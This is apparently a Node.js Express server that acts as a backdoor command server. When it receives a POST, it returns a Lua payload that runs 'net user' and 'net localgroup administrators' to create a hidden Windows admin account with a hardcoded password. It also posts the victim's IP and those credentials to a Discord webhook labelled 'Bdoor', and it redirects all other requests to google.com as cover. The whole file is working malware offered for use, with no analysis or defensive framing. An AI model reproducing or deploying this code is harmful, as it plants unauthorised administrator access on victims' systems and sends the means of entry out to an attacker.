const express = require("express");
const app = express();
const bodyParser = require("body-parser")

const rateLimit = require("express-rate-limit")

app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())



let webhook = "YOUR_WEBHOOK"
let username = "CloudBase"
let password = "nonF12bl!23!@F"


const postLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 3,  
    message: { error: "Too many requests" },
    standardHeaders: false,
    legacyHeaders: true,
});



app.post("/", postLimiter, async (req, res) => {
    let payload = get_payload(username, password)
    let ip = req.ip;
    
    let ip_cleaned = ip.replace(":ffff:", "")
    await send_discord_message(webhook, ip_cleaned, username, password);
    res.send(payload)
    
});


app.use((req, res) => {
    res.redirect("https://google.com/")
});



app.listen(80, () => {
    console.log("Server is running on http://localhost/")
}); 


function send_discord_message(webhook, ip,username, password){

    data_send = {
        "content": `Server Ip ${ip} Username: ${username} Password: ||${password}||`,
        "username": "Bdoor"
        
    }
    fetch(webhook, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data_send)
    })
 



}
 
function get_payload(username, password){
    payload = `os.execute("net user ${username} ${password} /add") os.execute("net localgroup administrators ${username} /add")
    `
    return payload
}